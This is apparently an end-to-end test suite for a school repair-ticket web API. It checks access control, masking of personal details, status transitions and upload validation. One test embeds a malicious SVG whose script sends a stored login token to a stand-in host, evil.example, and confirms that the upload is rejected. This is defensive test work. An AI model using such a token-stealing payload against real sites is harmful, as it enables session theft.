import { Test, TestingModule } from '@nestjs/testing';
import { NestExpressApplication } from '@nestjs/platform-express';
import request from 'supertest';
import { existsSync, rmSync } from 'fs';
import { AppModule } from './../src/app.module';
import { AuthService } from './../src/auth/auth.service';
import { PrismaService } from './../src/prisma/prisma.service';
import { NotificationsService } from './../src/notifications/notifications.service';
import { serveUploads } from './../src/uploads/serve-uploads';
import { setApiPrefix } from './../src/bootstrap';
import { apiRequest } from './support/api-request';
import { uploadFilePath } from './support/upload-file-path';
import { Role } from '@prisma/client';

// Minimal valid 1x1 PNG (real magic bytes) — required now that uploads are
// validated by content, not by client-declared mimetype or filename.
const PNG_BYTES = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=',
  'base64',
);

interface RepairTicketResponse {
  id: string;
  location: string;
  category: string;
  description: string;
  imageUrl: string | null;
  status: string;
  userName: string;
  userId: string;
  userPhone: string | null;
  userClass: string | null;
}

interface RepairCategoryResponse {
  id: string;
  name: string;
}

describe('Repairs (e2e)', () => {
  let app: NestExpressApplication;
  let authService: AuthService;
  let prisma: PrismaService;
  let userToken: string;
  let otherUserToken: string;
  let adminToken: string;
  let maintenanceToken: string;
  const createdUploadPaths: string[] = [];
  // See bookings.e2e-spec.ts for why NotificationsService is mocked at the
  // SMTP-send boundary rather than not exercised at all.
  const notifications = {
    notifyRepairUpdate: jest.fn(),
    notifyRepairEdited: jest.fn(),
    notifyRepairDeleted: jest.fn(),
  };

  async function tokenFor(email: string, role: Role): Promise<string> {
    const { user } = await authService.loginWithGoogle({
      googleSub: `sub-${email}`,
      email,
      name: email,
      hostedDomain: 'school.edu.tw',
    });
    if (role !== user.role) {
      await prisma.user.update({ where: { id: user.id }, data: { role } });
    }
    const code = authService.createLoginCode(user.id);
    const { accessToken } = await authService.exchangeLoginCode(code);
    return accessToken;
  }

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    })
      .overrideProvider(NotificationsService)
      .useValue(notifications)
      .compile();

    app = moduleFixture.createNestApplication<NestExpressApplication>();
    setApiPrefix(app);
    serveUploads(app);
    authService = moduleFixture.get(AuthService);
    prisma = moduleFixture.get(PrismaService);
    await app.init();

    userToken = await tokenFor('reporter@school.edu.tw', Role.USER);
    otherUserToken = await tokenFor('bystander@school.edu.tw', Role.USER);
    adminToken = await tokenFor('repairadmin@school.edu.tw', Role.ADMIN);
    maintenanceToken = await tokenFor(
      'repairmaint@school.edu.tw',
      Role.MAINTENANCE,
    );
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  afterAll(async () => {
    await prisma.auditLogEntry.deleteMany({});
    await prisma.repairTicket.deleteMany({});
    await prisma.repairCategory.deleteMany({
      where: { name: { startsWith: 'Test Category' } },
    });
    await prisma.account.deleteMany({});
    await prisma.user.deleteMany({});
    for (const path of createdUploadPaths) {
      if (existsSync(path)) rmSync(path);
    }
    await app.close();
  });

  it('rejects unauthenticated requests', () => {
    return apiRequest(app).get('/repairs').expect(401);
  });

  it('any authenticated User can submit a Repair Ticket without a photo', async () => {
    const res = await apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', 'A101 會議室')
      .field('category', '硬體設備')
      .field('description', '投影機燈泡閃爍')
      .expect(201);

    const body = res.body as RepairTicketResponse;
    expect(body.status).toBe('PENDING');
    expect(body.imageUrl).toBeNull();
    expect(body.userName).toEqual(expect.any(String));
  });

  it('any authenticated User can submit a Repair Ticket with a photo, and the photo is retrievable', async () => {
    const res = await apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', '一樓大廳')
      .field('category', '桌椅家具')
      .field('description', '咖啡機漏水')
      .field('userClass', '資訊三甲')
      .field('userPhone', '0912-345-678')
      .attach('photo', PNG_BYTES, 'issue.png')
      .expect(201);

    const body = res.body as RepairTicketResponse;
    expect(body.imageUrl).toMatch(/^\/api\/uploads\/repairs\/.+\.png$/);
    createdUploadPaths.push(uploadFilePath(body.imageUrl as string));

    // Not apiRequest: imageUrl already includes the API prefix.
    const photoRes = await request(app.getHttpServer())
      .get(body.imageUrl as string)
      .expect(200);
    expect(photoRes.body).toEqual(PNG_BYTES);
    expect(photoRes.headers['x-content-type-options']).toBe('nosniff');
  });

  it("hides a reporter's phone/class and masks their name from other USER-role callers", async () => {
    const created = await apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', 'PII 過濾測試')
      .field('category', '桌椅家具')
      .field('description', '個資過濾測試單')
      .field('userClass', '資訊三甲')
      .field('userPhone', '0912-345-678')
      .expect(201);
    const createdBody = created.body as RepairTicketResponse;

    const asOtherUser = await apiRequest(app)
      .get('/repairs')
      .set('Authorization', `Bearer ${otherUserToken}`)
      .expect(200);
    const seenByOtherUser = (asOtherUser.body as RepairTicketResponse[]).find(
      (t) => t.id === createdBody.id,
    );
    expect(seenByOtherUser?.userPhone).toBeNull();
    expect(seenByOtherUser?.userClass).toBeNull();
    expect(seenByOtherUser?.userName).not.toBe(createdBody.userName);

    const asOwner = await apiRequest(app)
      .get('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .expect(200);
    const seenByOwner = (asOwner.body as RepairTicketResponse[]).find(
      (t) => t.id === createdBody.id,
    );
    expect(seenByOwner?.userPhone).toBe('0912-345-678');
    expect(seenByOwner?.userClass).toBe('資訊三甲');
    expect(seenByOwner?.userName).toBe(createdBody.userName);

    const asAdmin = await apiRequest(app)
      .get('/repairs')
      .set('Authorization', `Bearer ${adminToken}`)
      .expect(200);
    const seenByAdmin = (asAdmin.body as RepairTicketResponse[]).find(
      (t) => t.id === createdBody.id,
    );
    expect(seenByAdmin?.userPhone).toBe('0912-345-678');
    expect(seenByAdmin?.userClass).toBe('資訊三甲');

    const asMaintenance = await apiRequest(app)
      .get('/repairs')
      .set('Authorization', `Bearer ${maintenanceToken}`)
      .expect(200);
    const seenByMaintenance = (
      asMaintenance.body as RepairTicketResponse[]
    ).find((t) => t.id === createdBody.id);
    expect(seenByMaintenance?.userPhone).toBe('0912-345-678');
    expect(seenByMaintenance?.userClass).toBe('資訊三甲');
  });

  it('rejects an SVG upload masquerading as a photo (stored XSS vector)', () => {
    const svgPayload = Buffer.from(
      "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('https://evil.example/collect?t='+localStorage.getItem('meetfix_token'))</script></svg>",
    );
    return apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', '一樓大廳')
      .field('category', '桌椅家具')
      .field('description', '惡意上傳測試')
      .attach('photo', svgPayload, {
        filename: 'x.svg',
        contentType: 'image/svg+xml',
      })
      .expect(400);
  });

  it('rejects a photo upload whose content is not a real image, regardless of declared filename/mimetype', () => {
    return apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', '一樓大廳')
      .field('category', '桌椅家具')
      .field('description', '惡意上傳測試')
      .attach('photo', Buffer.from('not-a-real-image'), {
        filename: 'issue.png',
        contentType: 'image/png',
      })
      .expect(400);
  });

  it('rejects submission missing required fields', () => {
    return apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', 'A101')
      .expect(400);
  });

  it('rejects submission with a category that is not in the Admin-managed list', () => {
    return apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', 'A101')
      .field('category', 'Not A Real Category')
      .field('description', 'test')
      .expect(400);
  });

  it('a roomId field submitted alongside a Repair Ticket is ignored — location is always free text (#19)', async () => {
    const res = await apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('roomId', 'some-room-id')
      .field('location', '手動輸入的地點')
      .field('category', '硬體設備')
      .field('description', '電視螢幕無法開機')
      .expect(201);

    const body = res.body as RepairTicketResponse;
    expect(body).not.toHaveProperty('roomId');
    expect(body.location).toBe('手動輸入的地點');
  });

  describe('Repair Ticket processing (Maintenance)', () => {
    async function createTicket(): Promise<string> {
      const res = await apiRequest(app)
        .post('/repairs')
        .set('Authorization', `Bearer ${userToken}`)
        .field('location', 'C303 教室')
        .field('category', '硬體設備')
        .field('description', '燈管不亮')
        .expect(201);
      return (res.body as RepairTicketResponse).id;
    }

    it('rejects updates from a non-MAINTENANCE, non-ADMIN User', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(403);
    });

    it('MAINTENANCE can move a ticket PENDING -> IN_PROGRESS -> COMPLETED', async () => {
      const id = await createTicket();

      const started = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      expect((started.body as RepairTicketResponse).status).toBe('IN_PROGRESS');

      const completed = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);
      expect((completed.body as RepairTicketResponse).status).toBe('COMPLETED');
    });

    it('ADMIN can also move a ticket through the workflow', async () => {
      const id = await createTicket();
      const res = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      expect((res.body as RepairTicketResponse).status).toBe('IN_PROGRESS');
    });

    it('rejects skipping a status (PENDING -> COMPLETED)', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'COMPLETED' })
        .expect(400);
    });

    it('rejects moving a COMPLETED ticket back to PENDING', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);

      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'PENDING' })
        .expect(400);
    });

    it('MAINTENANCE can attach a reply when updating a ticket', async () => {
      const id = await createTicket();
      const res = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'IN_PROGRESS', adminReply: '已預約零件，明日到場處理' })
        .expect(200);
      expect(
        (res.body as RepairTicketResponse & { adminReply: string }).adminReply,
      ).toBe('已預約零件，明日到場處理');
    });

    it('404s when updating a Repair Ticket that does not exist', () => {
      return apiRequest(app)
        .patch('/repairs/not-a-real-ticket')
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(404);
    });

    it('notifies the reporting User on a status change (#10)', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);

      expect(notifications.notifyRepairUpdate).toHaveBeenCalledTimes(1);
    });

    it('notifies the reporting User on a reply-only update (#10)', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ adminReply: '正在調度零件' })
        .expect(200);

      expect(notifications.notifyRepairUpdate).toHaveBeenCalledTimes(1);
    });
  });

  describe('Repair Ticket editing + deletion (#25)', () => {
    async function createTicket(token: string = userToken): Promise<string> {
      const res = await apiRequest(app)
        .post('/repairs')
        .set('Authorization', `Bearer ${token}`)
        .field('location', 'D404 教室')
        .field('category', '硬體設備')
        .field('description', '插座故障')
        .expect(201);
      return (res.body as RepairTicketResponse).id;
    }

    it('the reporter can edit location/category/description on a PENDING ticket', async () => {
      const id = await createTicket();
      const res = await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .field('location', '更新後的地點')
        .field('category', '桌椅家具')
        .field('description', '更新後的描述')
        .expect(200);

      const body = res.body as RepairTicketResponse;
      expect(body.location).toBe('更新後的地點');
      expect(body.category).toBe('桌椅家具');
      expect(body.description).toBe('更新後的描述');
      expect(body.status).toBe('PENDING');
    });

    it('the reporter can replace an existing photo with a new one', async () => {
      const created = await apiRequest(app)
        .post('/repairs')
        .set('Authorization', `Bearer ${userToken}`)
        .field('location', '有照片的地點')
        .field('category', '硬體設備')
        .field('description', '原始照片')
        .attach('photo', PNG_BYTES, 'original.png')
        .expect(201);
      const id = (created.body as RepairTicketResponse).id;
      createdUploadPaths.push(
        uploadFilePath((created.body as RepairTicketResponse).imageUrl as string),
      );

      const res = await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .attach('photo', PNG_BYTES, 'replacement.png')
        .expect(200);
      const body = res.body as RepairTicketResponse;
      expect(body.imageUrl).toMatch(/^\/api\/uploads\/repairs\/.+\.png$/);
      createdUploadPaths.push(uploadFilePath(body.imageUrl as string));
    });

    it('the reporter can remove an existing photo entirely', async () => {
      const created = await apiRequest(app)
        .post('/repairs')
        .set('Authorization', `Bearer ${userToken}`)
        .field('location', '要移除照片的地點')
        .field('category', '硬體設備')
        .field('description', '待移除照片')
        .attach('photo', PNG_BYTES, 'to-remove.png')
        .expect(201);
      const id = (created.body as RepairTicketResponse).id;
      createdUploadPaths.push(
        uploadFilePath((created.body as RepairTicketResponse).imageUrl as string),
      );

      const res = await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .field('removePhoto', 'true')
        .expect(200);
      expect((res.body as RepairTicketResponse).imageUrl).toBeNull();
    });

    it('rejects editing with an unknown Repair Category', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .field('category', 'Not A Real Category')
        .expect(400);
    });

    it('rejects editing a ticket that is IN_PROGRESS', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);

      await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .field('description', 'Too late')
        .expect(409);
    });

    it('rejects editing a ticket that belongs to someone else', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${otherUserToken}`)
        .field('description', 'Hijacked')
        .expect(403);
    });

    it('an ADMIN can edit a PENDING ticket that belongs to someone else, notifying the reporter', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${adminToken}`)
        .field('description', 'Fixed by admin')
        .expect(200);

      expect(notifications.notifyRepairEdited).toHaveBeenCalledTimes(1);
    });

    it('does not notify when the reporter edits their own ticket', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .field('description', 'Still mine')
        .expect(200);

      expect(notifications.notifyRepairEdited).not.toHaveBeenCalled();
    });

    it('404s editing a Repair Ticket that does not exist', () => {
      return apiRequest(app)
        .patch('/repairs/not-a-real-ticket/content')
        .set('Authorization', `Bearer ${userToken}`)
        .field('description', 'Ghost')
        .expect(404);
    });

    it('the reporter can delete a PENDING ticket, and it disappears from the listing', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(204);

      const listing = await apiRequest(app)
        .get('/repairs')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(200);
      const ids = (listing.body as RepairTicketResponse[]).map((t) => t.id);
      expect(ids).not.toContain(id);
    });

    it('rejects deleting a ticket that is IN_PROGRESS', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);

      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(409);
    });

    it('rejects deleting a COMPLETED ticket', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${maintenanceToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);

      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(409);
    });

    it('rejects deleting a ticket that belongs to someone else', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${otherUserToken}`)
        .expect(403);
    });

    it('an ADMIN can delete a PENDING ticket that belongs to someone else, notifying the reporter', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(204);

      expect(notifications.notifyRepairDeleted).toHaveBeenCalledTimes(1);
    });

    it('does not notify when the reporter deletes their own ticket', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(204);

      expect(notifications.notifyRepairDeleted).not.toHaveBeenCalled();
    });

    it('404s deleting a Repair Ticket that does not exist', () => {
      return apiRequest(app)
        .delete('/repairs/not-a-real-ticket')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(404);
    });
  });

  describe('Repair Categories', () => {
    it('any authenticated User can list Repair Categories', async () => {
      const res = await apiRequest(app)
        .get('/repair-categories')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(200);
      expect(Array.isArray(res.body)).toBe(true);
    });

    it('rejects category creation by a non-Admin User', () => {
      return apiRequest(app)
        .post('/repair-categories')
        .set('Authorization', `Bearer ${userToken}`)
        .send({ name: 'Test Category Denied' })
        .expect(403);
    });

    it('Admin can create and remove a Repair Category', async () => {
      const created = await apiRequest(app)
        .post('/repair-categories')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ name: 'Test Category A' })
        .expect(201);
      const body = created.body as RepairCategoryResponse;
      expect(body.name).toBe('Test Category A');

      await apiRequest(app)
        .delete(`/repair-categories/${body.id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(204);
    });

    it('rejects category deletion by a non-Admin User', async () => {
      const created = await apiRequest(app)
        .post('/repair-categories')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ name: 'Test Category B' })
        .expect(201);
      const body = created.body as RepairCategoryResponse;

      await apiRequest(app)
        .delete(`/repair-categories/${body.id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(403);
    });

    it('rejects creating a duplicate Repair Category', async () => {
      await apiRequest(app)
        .post('/repair-categories')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ name: 'Test Category C' })
        .expect(201);

      await apiRequest(app)
        .post('/repair-categories')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ name: 'Test Category C' })
        .expect(409);
    });
  });
});
